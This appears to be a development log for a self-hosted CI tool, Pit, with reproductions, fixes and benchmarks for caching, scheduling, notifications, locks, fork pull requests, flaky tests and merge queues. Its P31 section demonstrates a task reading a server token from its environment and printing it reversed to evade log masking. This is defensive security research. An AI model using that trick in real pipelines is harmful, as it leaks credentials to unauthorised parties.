run 1  src/a.txt 1792100094   src/b.txt 1792100094
run 2  src/a.txt 1792100094   src/b.txt 1792100097   .toolcache/stamp still there
```

Unchanged files keep their modification time and ignored directories survive. So
metadata-based tool caches work in Pit as they do on a laptop, with no `actions/cache`.

**Reproduction 2, a real tool:** T3 Code's `knip:check` (knip 6.34.0) in Pit's warm T3 Code
workspace, on the idle box:

| Run | Time | Result |
| --- | --- | --- |
| Without `--cache` | 213.8s | clean (exit 0) |
| `--cache`, empty cache | 36.1s | clean (exit 0) |
| `--cache`, warm | 7.7s | **2 false positives** (exit 1) |
| `--cache`, warm, after a one-file edit | 6.5s | **same 2 false positives** |
| Without `--cache`, after the edit | 202.4s | clean (exit 0) |

The false positives are `apps/server/src/testUtils/gitConfig.setup.ts` reported as an unused
file and `@shadcn/lint` as an unused devDependency. They repeat on every warm-cache run. I found
no knip issue about it. Reporting it upstream is left to the user, since it means posting
publicly.

**Verdict: SOLVED** on Pit's side: tool caches persist with correct modification times and no
configuration. The README now says so, and warns to check a tool's cache against a clean run
before gating on it. Not solved, because it is not Pit's to solve:
- **knip's cache.** Here it was 28× faster but wrong, so the T3 Code bench config still runs
  knip without it, and knip stays its slowest task (P21). Pit's own task cache keys on file
  contents and is not affected.
- **No `pit verify --fresh`.** `pit verify` skips Pit's cache, but it reuses the warm workspace
  and with it the tools' own caches. There is no command yet to run in a fresh workspace.

## P25. Leftover files on a persistent runner make broken builds pass

**Pain.** A reused runner keeps what earlier jobs left: generated code, build output, ignored
directories. A build can then pass on the runner and fail from a clean checkout. cmux found
"reload builds on reused self-hosted runners can compile source files removed from the requested
ref" and added `git clean -ffdx`
([manaflow-ai/cmux#12608](https://github.com/manaflow-ai/cmux/pull/12608)). Teams add cleanup
steps or actions for this
([community#51329](https://github.com/orgs/community/discussions/51329),
[Vendic cleaner](https://github.com/Vendic/github-self-hosted-runner-workspace-cleaner),
[rtCamp/action-cleanup](https://github.com/rtCamp/action-cleanup),
[Rob Bos](https://dev.to/rob_bos/cleaning-up-files-changed-by-a-github-action-that-runs-in-a-container-57bc)),
or delete their defensive cleanup code once they move to throwaway VMs
([vouchington#554](https://github.com/vouchington/vouchington/issues/554)). Pit keeps ignored
files on purpose (P8, P24), so it has this failure mode by design.

**Reproduction** (`/tmp/painhunt/p25`): a workspace-cached `setup` runs `gen.sh`, which writes
`gen/current.js` and `gen/legacy.js` (`gen/` is ignored), and `test` requires both. Commit 2
stops generating `legacy.js` but the test still requires it: a real bug.

**Before** (research/pain-hunt at P24):

```
commit 2, pit run      ✓ setup  ✓ test   passed       (stale gen/legacy.js from commit 1)
commit 2, pit verify   ✓ setup  ✓ test   passed       (verify only skipped the cache)
commit 2, clean clone  Error: Cannot find module './gen/legacy.js'
```

**Fix** (research/pain-hunt): `pit run --fresh` runs each group in a new, empty workspace. The
workspace is registered as busy so workspace cleanup (P19) leaves it alone, then deleted when
the group ends. The git mirror is still shared, so only the checkout is cold. `pit verify` is
now `--no-cache --fresh`, the run a brand-new runner would do.

```
commit 2, pit run      ✓ setup  ✓ test             passed in 305ms
commit 2, pit verify   ✓ setup  ✗ test exit 1      Error: Cannot find module './gen/legacy.js'
```

No `~fresh` workspace was left afterwards. Covered by the e2e test
`fresh_runs_do_not_see_files_earlier_runs_left_behind`.

**Verdict: PARTIAL.** Pit can now prove that a result does not depend on warm state, but only
when someone runs `pit verify`.
- **Not automatic.** Normal and post-merge runs stay warm because that is the speed (P8, P21),
  so a bug hidden by warm state passes them.
- **No scheduled fresh run.** The fix is a periodic `pit verify` (nightly cron, or before
  releases), and Pit has no built-in schedule for it yet.
- **It is slow.** A fresh run is cold. On T3 Code that means the 162s install, at least.

## P26. Scheduled CI runs late, gets dropped, or is silently disabled

**Pain.** Nightly and periodic jobs are where slow, cold, or fresh-environment checks go (P25's
`pit verify`, dependency audits, full test runs). GitHub says scheduled workflows "can be delayed
during periods of high loads… If the load is sufficiently high enough, some queued jobs may be
dropped", and that in public repos they are "automatically disabled when no repository activity
has occurred in 60 days". One measurement of four public workflows scheduled every 15 minutes
found only 64% of slots got a run, with a median delay of 7.4 minutes. Keepalive actions commit
to the repo just to stop schedules being disabled
([runhooks](https://runhooks.app/blog/github-actions-scheduled-workflows-unreliable/),
[lastping](https://lastping.dev/monitor/github-actions-scheduled-disabled/),
[hyperping](https://hyperping.com/blog/how-to-monitor-github-actions-scheduled-workflows),
[steadycron](https://steadycron.com/guides/github-actions-schedule-not-running/),
[cronuru](https://cronuru.com/guides/github-actions-scheduled-workflows),
[dev.to](https://dev.to/amareswer/github-actions-workflow-not-triggering-every-cause-and-fix-5070),
[efrecon/gh-action-keepalive](https://github.com/efrecon/gh-action-keepalive)).

**Before** (research/pain-hunt at P25): Pit had no schedules at all. P25's fix, a fresh
`pit verify`, only helps if someone remembers to run it. **NOT SOLVED.**

**Fix** (research/pain-hunt): `schedules` in the config, each with a five-field UTC `cron` and
optional `tasks`, `fresh` and `noCache`. The cron parser is built in, with no new dependency.
The server reads schedules from the config on each repo's default branch, memoized per tip, and
checks twice a minute. A `schedules` table records each fired slot, so a slot fires exactly once,
even across two ticks in the same minute. When a slot is due, the server fetches, then starts a
trusted run of the branch tip as `schedule:<name>`. A bad cron is a config error, like other
typos (P6).

**Live check** (`/tmp/painhunt/p25`, the repo whose stale generated file hides a bug): I added
`verify: { cron: "* * * * *", fresh: true, noCache: true }` and committed it at 21:59:12.

```
pit run (warm)            passed in 388ms
21:59:40 schedule verify on app-676dfe: started run_6aae646be56b
run_6aae646be56b  failed  schedule:verify main   Error: Cannot find module './gen/legacy.js'
```

The scheduled fresh run caught the bug the warm run passes, 28s after the commit, with no one
running anything. After the schedule was removed, no further scheduled runs appeared over the
next 75s. Covered by the unit tests `matches_like_cron`, `rejects_bad_expressions`,
`calendar_is_right` and `a_schedule_slot_fires_once`, and the e2e test
`schedules_start_one_run_per_slot`.

**Verdict: SOLVED** for scheduling on a server you run: no load-based delay beyond the 30s tick,
no dropped slots while the server is up, and no inactivity shutoff. Not done:
- **Missed slots are not replayed.** A slot that falls while the server is down is skipped.
- **UTC only.** There are no time zones.
- **Default branch only.** Only the default branch's config is read, and that branch is guessed
  for non-GitHub repos (`main`, then `master`, then `trunk`).
- **No failure notification.** A failed scheduled run notifies no one beyond the dashboard and
  GitHub statuses.

## P27. Nobody hears that main is broken

**Pain.** GitHub sends failure notifications to the person who triggered a run, and for
scheduled workflows to whoever last edited the cron line, not to the team. So every team adds a
Slack step with `if: failure()` to each workflow, often restricted to `main` and with mention
groups, or a separate `workflow_run` workflow just to send alerts
([slack-github-action guide](https://pullnotifier.com/tools/slack-github-actions),
[ravsam](https://www.ravsam.in/blog/send-slack-notification-when-github-actions-fails/),
[dev.to](https://dev.to/ravgeetdhillon/send-slack-notification-when-github-actions-fails-1ba6),
[Gitera](https://gitera.io/blog/github-actions-email-notifications),
[GitNotifier](https://www.gitnotifier.com/blog/send-slack-notifications-github-actions),
[OneUptime](https://oneuptime.com/blog/post/2025-12-20-github-actions-notifications/view)).
Alerting on every failure is noisy, so people tune it by hand.

**Before** (research/pain-hunt at P26): Pit had no notifications. P26's scheduled `pit verify`
caught P25's bug, but only the dashboard showed it. **NOT SOLVED.**

**Fix** (research/pain-hunt): `--notify-url` / `PIT_NOTIFY_URL` on `pit server` and `pit up`.
- **Which runs:** only trusted runs (P20) notify. Each line is tracked separately: the branch
  (pushes and post-merge runs) and each schedule. PR, local and merge queue runs never notify,
  and cancelled or superseded runs are ignored.
- **When:** only on a change of state, recorded in a `notify_state` table. That is one message
  when a line breaks and one when it is fixed.
- **Payload:** Slack-compatible JSON (`text`) plus structured fields (`event`, `repo`, `ref`,
  `trigger`, `run`, `url`, `failed`).

**Live check** (`/tmp/painhunt/p27`, a schedule every minute driving trusted runs; a Python
receiver logging what it gets):

```
00:13:21 Pit: app-2fdd9f main (schedule:watch) is broken: default.check failed. http://127.0.0.1:7070/runs/run_23340940390d
         (next scheduled run, still failing: no message)
00:15:23 Pit: app-2fdd9f main (schedule:watch) is fixed. http://127.0.0.1:7070/runs/run_d1e640ac7ff9
```

Covered by the unit test `only_state_changes_notify` and the e2e test
`notifies_when_a_trusted_line_breaks_and_is_fixed`, which uses an in-process webhook receiver
and expects exactly `["broken", "fixed"]` over break, still broken, fixed.

**Verdict: SOLVED** for team alerts on main and schedules, with no per-workflow wiring. Not done:
- **No retry.** Delivery is one attempt with a 10s timeout; a failure is logged.
- **No mentions.** The message does not mention the people who caused the break.
- **One URL.** There is one notify URL per server, not per repo.

## P28. Re-running a failure repeats the whole job

**Pain.** When one step fails for a reason outside the code (a service down, a network blip),
GitHub can re-run failed jobs, and since 2022 individual jobs, but not a step. A re-run gets a
fresh runner and repeats checkout, setup, install and build before it reaches the step that
failed. People ask for step-level re-runs and resume-from-failure, and work around it with retry
loops, retry actions, or `actions/cache` marker files that skip work that already passed
([community#27121](https://github.com/orgs/community/discussions/27121),
[#4278](https://github.com/orgs/community/discussions/4278),
[GitHub changelog](https://github.blog/changelog/2022-03-17-github-actions-re-run-only-failed-or-individual-jobs/),
[GitHub blog](https://github.blog/news-insights/product-news/save-time-partial-re-runs-github-actions/),
[This Dot](https://www.thisdot.co/blog/how-to-retry-failed-steps-in-github-action-workflows),
[Medium](https://medium.com/@tcorbisier/github-actions-re-run-a-single-5e9f1744c788)).

**Reproduction** (`/tmp/painhunt/p28`): `install` (3s, workspace cache), `build` (3s, outputs)
and `lint` (2s) feed `test`. `test` fails while a marker file says the database is down. One run
with the database down, then a rerun after it is back.

```
first run   ✓ install 3.1s  ✓ lint 2.0s  ✓ build 3.0s  ✗ test (ECONNREFUSED)   failed in 7.6s
rerun       ◆ install  ◆ lint  ◆ build  ✓ test 1.0s                          passed in 1.5s · 1 ran, 3 cached
```

That needed no configuration. Every task is its own cached step, and failures are not cached,
so a rerun repeats exactly the failed task and anything downstream of it. The same holds for
GitHub's "Re-run" button: Pit plans a new run, and everything that passed is a cache hit.

**Gap found:** the rerun said "ran because nothing was cached for it yet", or compared against an
older success ("package.json changed; build changed"). Both are true and neither is the reason.

**Fix** (research/pain-hunt): before explaining a miss, the worker asks
`/api/cache/failed/{key}` whether a task with these exact inputs failed before. The lookup
uses a new `tasks(action_key)` index.

```
rerun   ✓ test 1.1s  ran because it failed with these same inputs in run_5e109e42daad (failures are not cached)
        passed in 1.3s · 1 ran, 3 cached
```

Covered by the e2e test `a_rerun_reruns_only_what_failed_and_says_why`.

**Verdict: SOLVED.** A rerun costs only the failed task, and says why it ran. Not done: a task
that is itself long (a 10-minute test suite) still reruns in full, since Pit's unit of work is the
task. Splitting it (`shards`, P14) is the answer there.

## P29. Two runs clobber a shared test environment

**Pain.** Integration tests against a shared staging database, or deploys to one environment,
break when two runs overlap. GitHub's `concurrency` groups were the answer, but for years a
group could hold only one pending run: a third run cancelled the waiting one ("Canceling since a
higher priority waiting request … exists"), and `cancel-in-progress: false` does not prevent
that ([community#32376](https://github.com/orgs/community/discussions/32376),
[#5435](https://github.com/orgs/community/discussions/5435),
[#69704](https://github.com/orgs/community/discussions/69704),
[GitHub docs](https://docs.github.com/actions/writing-workflows/choosing-what-your-workflow-does/control-the-concurrency-of-workflows-and-jobs),
[RunsOn](https://runs-on.com/github-actions/concurrency/),
[ZeroOne](https://laplusda.com/en/posts/github-actions-concurrency-pending-cancelled/)).
GitHub added `queue: max` in May 2026, capped at 100 waiting runs. The older workaround was a
dedicated self-hosted runner per resource.

**Reproduction** (`/tmp/painhunt/p29`): two clones on branches `feature-a` and `feature-b`. Local
runs on different branches do not supersede each other. Group `integration` runs one task: it
writes its run id to a shared "staging DB" file, sleeps 3s, then checks the file still holds its
id. `pit run` starts in both, half a second apart, on the 2-slot worker.

**Before** (research/pain-hunt at P28): Pit had no way to serialize across runs. Both groups ran
at once:

```
run A   e2e │ staging clobbered by run_ba85e6384f2b     failed
run B   e2e │ staging data intact                       passed
```

**Fix** (research/pain-hunt): `lock: "<name>"` on a group, stored on each planned group (shards
included). Claiming skips a queued group while any running group holds the same lock. The check
runs inside the claim's SQLite transaction, so two workers cannot both take it. A waiting group
says so through P23's waiting message.

```
run A   e2e │ staging data intact                                         passed in 4.5s
run B   integration (any) waiting: lock `staging-db` is held by run_40901f683c52
        e2e │ staging data intact                                         passed in 6.9s
```

Covered by the unit test `groups_sharing_a_lock_run_one_at_a_time`.

**Verdict: SOLVED** for serializing shared resources. Waiting groups are never cancelled, with no
queue cap, and the wait is explained. Not done:
- **Group granularity.** The lock covers the whole group, setup included, so a lock on a large
  group serializes more than it needs to. Put the locked tasks in their own group.
- **No counting locks.** A lock admits one group at a time; "at most N at once" is not supported.
- **Not tied to supersede.** A run superseded while it waits is cancelled as usual (P9), which is
  what a newer push wants.

## P30. Parallel jobs each redo the same build

**Pain.** Fanning tests out over parallel jobs (a matrix, or shards) means every job needs the
build. The standard answer is a separate build job that uploads an artifact; the test jobs wait
for it with `needs:` and download it. That adds a serial stage, upload and download time, and
YAML plumbing. Some steps cannot move between jobs that way at all, because they depend on local
caches or side effects
([community#14484](https://github.com/orgs/community/discussions/14484),
[pmunhoz](https://blog.pmunhoz.com/blog/github-actions/github-actions-matrix-builds/),
[OneUptime artifacts](https://oneuptime.com/blog/post/2026-01-25-github-actions-artifacts/view),
[OneUptime parallel tests](https://oneuptime.com/blog/post/2025-12-20-github-actions-parallel-tests/view),
[eastondev](https://eastondev.com/blog/en/posts/dev/20260428-github-actions-matrix/)).

Pit already shares outputs through the cache (P14: "setup is repeated per shard, and shared
through the cache"). But that only helps once something is cached. Shards that start together
all miss.

**Reproduction** (`/tmp/painhunt/p30`): `build` (5s, outputs `dist/`) feeds a `test` with
`shards: 3`, on the 2-slot worker. Each build execution appends a line to `builds.log`.

**Before** (research/pain-hunt at P29):

```
✓ build 5.6s  ran because nothing was cached for it yet
✓ build 5.4s  ran because nothing was cached for it yet
◆ build cached
wall 9.07s; build executed 2 times
```

With N workers the build would run N times, on a box where CPU is already the bottleneck (P21).

**Fix** (research/pain-hunt): single flight for cache misses. Before running a missed remote-cached
task, the worker claims its action key (`POST /api/cache/{key}/claim`). The first claimant runs
it. Later claimants are told to wait while that task is still running. They poll the cache and
restore the result when it lands, and say they waited. If the holder fails or dies, the next
claim takes over, so nothing waits forever. Keys are scoped by trust (P20), and a claim ends
when the result is stored.

```
default#1  ✓ build 5.0s  ran because src/a changed
default#2  ◆ build  cache hit, saved 5.0s; waited 5.2s for the same task in run_ed6caa159ffc instead of running it again
default#3  ◆ build  cache hit, saved 5.0s
wall 7.54s; build executed 1 time
```

Covered by the e2e test `concurrent_identical_tasks_run_once`: three shards, one build, and the
case where the first build fails and a waiter takes over.

**Verdict: SOLVED** for duplicate work on identical actions, across shards and across runs of the
same inputs. Not done:
- **A waiting shard keeps its slot.** The CPU is free but the slot is busy, so on a small fleet
  waiting can delay other groups.
- **Workspace-cached tasks are not single-flighted.** `install` is per workspace, so each shard
  still installs (or finds its warm workspace already installed).

## Review of P21–P30

An independent reviewer read every change from P21 to P30. It found nothing critical but ten real
bugs. All are fixed (`cargo test`: 47 unit, 23 e2e), and P29 and P30 were re-checked live
afterwards: one build for three shards, and two locked runs one after the other, both intact.

1. **Single flight was check-then-act.** The claim was read and written under two separate lock
   acquisitions, so two simultaneous misses could both win and both build: exactly what P30 was
   meant to stop. Takeovers had the same race. Check and claim now happen under one guard, and
   the guard also re-checks the cache.
2. **Locks were global across repos.** Any repo's runs could hold, and starve, another repo's
   lock. Locks are now per repo. Inside a repo, a run can still hold its lock up to its task
   timeouts (fork PRs never run automatically).
3. **Cancelling released a lock while the work was still running.** The group was marked
   skipped at once, but its worker only stops at its next heartbeat. A cancelled holder now keeps
   the lock for a 10-second grace period. Unit test added.
4. **Schedules could switch off silently.** A config error, even a transient timeout, was cached
   as "no schedules" until the next commit. Errors are now logged and not cached.
5. **Schedules could miss a minute.** A tick only checked the minute it started in, so a tick
   slower than 30s skipped minutes, and one failing schedule aborted the rest of the tick. Each
   tick now covers every minute since the last one (at most ten), and errors are logged per
   schedule. The e2e test checks the catch-up.
6. **Notify could drop or invert transitions.** State was recorded before the post, so a failed
   post lost the message. Out-of-order main runs could also report "broken" while main was green.
   State is now recorded only after a successful post, and runs older than the last recorded one
   are ignored. Unit test added.
7. **A locked group was briefly claimable without its lock.** The lock was set in a second
   statement; it is now inserted with the group.
8. **The SIGPIPE change applied to the daemons.** A closed log pipe would have killed a server
   or worker. It is now restored for client commands only.
9. **The single-flight table grew forever.** Entries are now removed when their task finishes.
10. **Stale "waiting:" messages stayed on running groups.** They are now cleared when the group
    is claimed.

## P31. Fork pull requests: no CI, or CI that leaks secrets

**Pain.** CI for outside contributors is a trade-off on GitHub.
- `pull_request` from a fork runs without secrets, so anything that needs one fails, and
  first-time contributors wait for "Approve and run".
- `pull_request_target` has secrets but runs in the base repo's context. Checking out the fork's
  code there is a "pwn request": remote code execution with every secret in the repo. The
  AsyncAPI incident (37 malicious PRs, undetected for 58 days) is one example.
- The approval gate does not even apply to `pull_request_target`.

Sources: [GitHub docs](https://docs.github.com/en/enterprise-server@3.12/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/approving-workflow-runs-from-public-forks),
[Orca](https://orca.security/resources/blog/pull-request-nightmare-part-2-exploits/),
[appsecbrief](https://appsecbrief.com/articles/github-actions-pwn-request-pull-request-target-secrets-exfiltration-2026/),
[Code With Karani](https://www.codewithkarani.com/blog/github-actions-pull-request-target-fork-checkout-pwn-request),
[GitGuardian](https://blog.gitguardian.com/github-actions-security-cheat-sheet/),
[Aikido](https://www.aikido.dev/blog/checklist-github-actions),
[dev.to](https://dev.to/bdougieyo/running-github-actions-on-forks-16bd).

**Before** (research/pain-hunt at P30):
- **Forks got no CI at all.** Pit ignored fork pull requests. The only path was the `pit:merge`
  label, which runs the fork as a trusted queue run.
- **A worse finding.** Tasks inherit the worker's whole environment except `PIT_*`, so the
  `secrets` field only *masked* values; it never gated them. In `/tmp/painhunt/p31` a task that
  did not declare anything read the token the local server had in its environment, and printed
  it reversed to get past masking:

```
leak │ token starts with tok_live
leak │ a4b5c6d7e8f9_evil_kot
```

**Fix** (research/pain-hunt):
- **`pit worker --secrets-file FILE`** (`KEY=VALUE`, `PIT_SECRETS_FILE`). Those values are
  never inherited and reach only tasks that list them in `secrets`.
- **`pit:run` label on a fork PR** runs that one commit as an untrusted run. A later push needs
  the label again, so code cannot be swapped in after a review. The run:
  - gets no `secrets` and no `env` values, and only a minimal inherited environment (`PATH`,
    `HOME`, locale, temp dirs);
  - uses a fresh workspace (P25);
  - always uses the `docker` backend, which sees only its workspace, so it cannot read the
    secrets file or other workspaces. A worker without Docker refuses it.
- **An opened fork PR** is ignored with a message saying to add `pit:run`.

Live, after moving the local server's token into a secrets file:

```
undeclared   leak │ token starts with            (nothing)
declared     leak │ token starts with tok_live    (the task asked for it in `secrets`)
```

The declared case still shows that a task holding a secret can print it in a form masking does
not catch. That is P13's limit, unchanged.

Covered by the unit tests `hidden_and_minimal_environments` and `parses_dotenv_style_lines`, and
the e2e test `fork_pull_requests_run_on_a_label_without_secrets`. That test sends signed
webhooks: an opened fork PR is ignored, `pit:run` starts a run, and that run cannot see a worker
secret its config asks for, as both `secrets` and `env`.

**Verdict: PARTIAL.**
- **Solved for forks.** CI runs on a maintainer's per-commit approval, sealed off from secrets
  and the worker's files.
- **Not solved for operators.** A worker that keeps secrets in its own environment still
  exposes them to every task, and the default `pit up` does exactly that if you export a token
  before starting it. The secrets file is the fix, and it is opt-in.
- **Same-user reads.** On the `host` backend a same-repo task runs as the worker's user and can
  read the secrets file directly. That is the same exposure as GitHub's same-repo PRs, which
  get secrets.

## P32. A new branch starts with a cold cache

**Pain.** GitHub Actions caches are scoped by branch. A run can restore only caches made on its
own branch, its pull request's base branch, or the default branch, so `feature-b` cannot use
what `feature-a` just built. If no workflow saves a cache on `main`, every new pull request
starts cold. The official workaround is to run the workflow on `main` (on push or on a schedule)
just to fill a cache there
([GitHub docs](https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching),
[actions/cache tips](https://github.com/actions/cache/blob/main/tips-and-workarounds.md),
[saveriomiroddi](https://saveriomiroddi.github.io/Improving-the-Github-Actions-caching-effectiveness/),
[Earthly](https://earthly.dev/blog/caching-dependencies-github-actions/),
[medium](https://medium.com/@everton.spader/how-to-cache-package-dependencies-between-branches-with-github-actions-e6a19f33783a),
[community#194493](https://github.com/orgs/community/discussions/194493)).

**Reproduction**: T3 Code on a branch Pit had never seen (`brand-new-branch-…`), running
`install`, `electron` and `typecheck:apps/web` (per-package config, P21).

```
◆ install  cached   ◆ electron  cached   ◆ typecheck:apps/web  cached
passed in 23.2s · 0 ran, 3 cached          (first measurement, load ~1.5)
```

Nothing ran. The cache keys on file contents, not branches, and warm workspaces are per repo and
group, so a new branch starts as warm as any other. Untrusted branches still never feed trusted
runs (P20).

**But 23.2s for a run with nothing to do was a regression.** The same cached run took 1.0s in
the first benchmark. Repeats took about 8s, and the monolithic config took 19.9s under load.
Tracing showed planning at 4.4s, almost all of it reading the config: P21's workspace context
read every tracked `package.json`, all 356 of them, mostly vendored code under `.repos/`, one
`git show` process at a time, before checking which ones the workspace globs select.

**Fix** (research/pain-hunt): read `package.json` and `pnpm-workspace.yaml` first, then only the
manifests the globs select (about 30 here), all through one `git cat-file --batch`
(`git::read_blobs`, unit test `reads_many_files_in_one_batch`). Planning now logs its phases at
debug level.

```
planning   4.4s → 0.74–0.99s   (config 4.1s → 0.37–0.43s)
fully cached T3 Code run (new branch): ~8s → 2.2–2.4s, measured at load average 11
```

**Verdict: SOLVED** for new branches: no per-branch cache, and no cold start for a branch Pit
has not seen. The regression is fixed, but a fully cached run is still about 2.2s here, against
1.0s on an idle box with the original 7 tasks. The remainder is planning (indexing 28k files)
and the CLI's snapshot.

During this iteration the full e2e suite failed once with two timing-sensitive tests
(`fully_cached_runs_do_not_wait_for_busy_workers` and
`merge_queue_lands_disjoint_lanes_in_parallel_and_ejects_failures`) while the box was at load
average 7–11. Three reruns, two of them full suites, passed. Those tests may be flaky under
heavy load.

## P33. Nobody knows which tests are flaky

**Pain.** GitHub Actions has no flaky-test tracking, and "re-running jobs hides flakes rather than
surfacing them". The reliable signal is the same code producing different outcomes, and the
usual remedy is to quarantine the test while it is fixed. Teams buy this separately: Trunk,
BuildPulse, Datadog CI Visibility
([BuildPulse guide](https://buildpulse.io/compare/best-flaky-test-tools),
[BuildPulse](https://buildpulse.io/products/flaky-tests),
[Trunk vs BuildPulse](https://trunk.io/compare/trunk-vs-buildpulse),
[Panto](https://www.getpanto.ai/blog/best-flaky-test-tools),
[Blacksmith](https://info.blacksmith.sh/task/blog/github-actions-reduce-flaky-test-noise),
[tinycto](https://tinycto.tv/learn/flaky-test-quarantine-and-ci-pipeline-trust)).

**Before** (research/pain-hunt at P32): Pit flagged a pass on a retry as `flaky:` (P2), counted
it in stats, and did not cache it. It had no per-task history and no way to keep a known flake
from blocking. **PARTIAL.**

**Fix** (research/pain-hunt):
- **`pit flaky [--days N]`** (`/api/flaky`). Every task result already carries its action key,
  so "same inputs, different outcome" is a single query: input sets of a task that have both
  passed and failed, plus passes that needed a retry.
- **`quarantine: true` on a task.** It still runs and reports, with its failure marked
  "quarantined", but it does not fail the group, the run, or a merge queue candidate.

**Live** (`/tmp/painhunt/p33`, an `e2e-checkout` task that fails every third run with a selector
timeout; identical code each run):

```
4 runs: passed, failed, passed, passed

$ pit flaky --days 1
task                              runs   failed  passed retry  same inputs  last run
work default.flaky                   7        3             2            2  run_2763889c0e1c
app-cb0e0b default.test              6        3             0            3  run_06775e9a4abc
app-676dfe default.test              8        2             0            2  run_c2a4f1cb8038
t3code ci.test-web                  14        6             0            2  run_31b7d4e8dff3
a integration.e2e                    6        1             0            1  run_4c3e0b022f70
app-210a93 default.e2e-checkout      4        1             0            1  run_b86ab98d0ccb
tc17 default.test                    5        1             0            1  run_0b3a4856bd6a

after `quarantine: true`:
✗ e2e-checkout exit 1 — quarantined, so this does not fail the run: exited with 1
passed in 245ms
```

The report also picked up the earlier hunt repos, and one entry is real: T3 Code's `test-web`
failed 6 of 14 times, twice with identical inputs. Those are the contention timeouts from P21,
flakes caused by the environment. Covered by the e2e test
`flaky_tasks_are_reported_and_quarantine_keeps_runs_green`: a retried pass, a same-inputs flip,
and an always-failing quarantined task that is reported as broken, not flaky.

**Verdict: SOLVED** at task level. Not done:
- **Task-level only.** A task is usually a whole test suite, so this names `test-web`, not the
  one test inside it. Per-test tracking would need JUnit output parsing.
- **Manual quarantine.** Nothing quarantines automatically or lifts it after N clean days.

## P34. "Exited with 1": finding the failed test means reading the log

**Pain.** A failed test job on GitHub Actions shows a red step and its log. Finding which test
failed means scrolling the runner's output. The usual fix is a third-party action that parses
JUnit XML into a check run or job summary: `dorny/test-reporter` or `mikepenz/action-junit-report`.
Each needs `if: always()` (or it is skipped exactly when tests fail), `checks: write`
permission, and a separate `workflow_run` workflow for pull requests from forks
([dorny/test-reporter](https://github.com/dorny/test-reporter),
[action-junit-report](https://github.com/marketplace/actions/junit-report-action),
[zendesk fork](https://github.com/zendesk/action-junit-report),
[dev.tools](https://dev.tools/blog/junit-reports-for-api-tests-make-github-actions-show-failures-cleanly/),
[Octopus](https://octopus.com/blog/githubactions-running-unit-tests),
[DZone](https://dzone.com/articles/running-unit-tests-in-github-actions),
[CI Cube](https://cicube.io/workflow-hub/dorny-test-reporter/)).

**Before** (research/pain-hunt at P33): Pit said "exited with 1". P16's error excerpt helps, but
it guesses from keywords; it does not know which tests failed.

**Reproduction** (`/tmp/painhunt/p34`): 42 `node --test` tests, two of them failing, with Node's
JUnit reporter writing `reports/junit.xml`.

```
without `reports`:  ✗ default.test: exited with 1                    (82 log lines to read)
with `reports`:     ✗ default.test: exited with 1; 2 of 42 tests failed:
                      test.cart applies coupons (90 == 80);
                      test.cart checks out (Cannot read properties of undefined (reading 'pay'))
after the fix:      ✓ test   log: [pit: 42 tests passed]
```

**Fix** (research/pain-hunt): a `reports` field on a task (JUnit XML globs).
- **Before each attempt** the worker deletes matching files. Reports usually live in ignored
  directories, which survive in warm workspaces, so an old failure must not be reported again.
- **After the run** it parses the reports with `quick-xml` (new dependency), counting test
  cases, failures, errors and skips. The failed tests and the first line of each message are
  appended to the failure message, which the CLI, dashboard, GitHub and MCP agents (P16) all
  show. A passing run logs the count.

Covered by unit tests (`names_the_failed_tests`, `a_clean_report_and_garbage`) and the e2e test
`junit_reports_name_failed_tests`, which includes the stale-report case. Writing the e2e test
caught a parser bug: self-closing `<failure message="…"/>` elements were dropped.

**Verdict: SOLVED** for naming failed tests, from any runner that writes JUnit XML. Not done:
- **No line annotations.** There are no file and line annotations on GitHub check runs.
- **Task-level flakiness.** `pit flaky` (P33) still works per task, not per test.
- **Wrong runner arguments show up as wrong reports.** A misconfigured runner produces a
  misleading report. On the way, `node --test test/` with Node 22 treated the directory as one
  file, and the report said "1 of 1 tests failed".

## P35. The merge queue becomes the bottleneck

**Pain.** A serial queue lands one change per CI run. With 15-minute CI and 10 queued pull
requests, the last one waits 2.5 hours; at about 10 PRs an hour, changes sit in the queue for
hours. GitHub's merge queue answers this with batching (up to 5 PRs tested as one merge commit
by default) and build concurrency (up to 100). Bigger batches trade latency against bisection
when a batch fails, and flaky tests make that worse
([humanwhocodes](https://humanwhocodes.com/blog/2026/04/improving-developer-velocity-github-merge-queue/),
[tenki](https://tenki.cloud/blog/github-merge-queue-setup),
[7tonshark](https://7tonshark.com/posts/rushjs-merge-queue/),
[Mergify batches](https://docs.mergify.com/merge-queue/batches/),
[Mergify analytics](https://mergify.com/learn/queue-analytics),
[moderngitacademy](https://moderngitacademy.com/github/pull-requests/merge-queues/)).

**Reproduction** (`/tmp/painhunt/p35`): a repo with 10 packages, each with its own 5-second
`test<i>`, and a 5-second `integration` task that reads `shared/**`. Twenty branches:
- `dis0..9`: each changes only its own package (disjoint).
- `ovl0..9`: each adds a file under `shared/` (all overlap on `integration`).

All 10 of a set are queued at once on the 2-slot worker; the clock stops when all 10 have landed.

```
disjoint (10 lanes):            10 PRs landed in 27.2s
overlapping (1 lane, chain):    10 PRs landed in 29.9s
a serial queue, same work:      ≥ 50s (10 × 5s, one after another)
lower bound on 2 slots:         25s for 10 five-second runs
```

Both sets landed at close to the speed of the hardware. Disjoint changes form independent lanes
(each tested only on its own `test<i>`); overlapping changes are tested speculatively on top of
each other (`tip+A`, `tip+A+B`, …), and those candidate runs execute in parallel and, with P22,
ahead of other work.

**Gap found:** each candidate is a full CI run. 10 overlapping PRs cost 10 runs; a batch of 5
(GitHub's default) would test them in about 2. When workers, not latency, are the limit, batching
lands more per CPU, and Pit has no batching. Also, every landing gets a post-merge run of
everything (the backstop for undeclared inputs). In this test, with `cache: false`, the 10
post-merge runs kept the box busy for about a minute after the queue had drained. With caching
on, as is the default, most of that is cache hits.

**Verdict: PARTIAL.**
- **Latency: SOLVED.** Lanes and speculative chains in parallel; measured near the lower bound.
- **CI cost per landed change: NOT SOLVED.** There is no batching, which would mean testing only
  a lane's newest candidate and bisecting on failure. That is a larger change to the queue,
  left for later.

## P36. Batching for the merge queue (P35's open gap)

**Pain.** As P35: with CI on every candidate, a deep queue costs one full run per change.
GitHub's merge queue batches up to 5 changes into one merge-commit test by default; Mergify's
batches and Bors's "rollups" do the same, and all of them bisect a failed batch
([Mergify batches](https://docs.mergify.com/merge-queue/batches/),
[tenki](https://tenki.cloud/blog/github-merge-queue-setup),
[humanwhocodes](https://humanwhocodes.com/blog/2026/04/improving-developer-velocity-github-merge-queue/)).

**Before** (research/pain-hunt at P35): 10 overlapping changes on the 2-slot worker, 5-second
checks, landed in 29.9s using 10 runs.

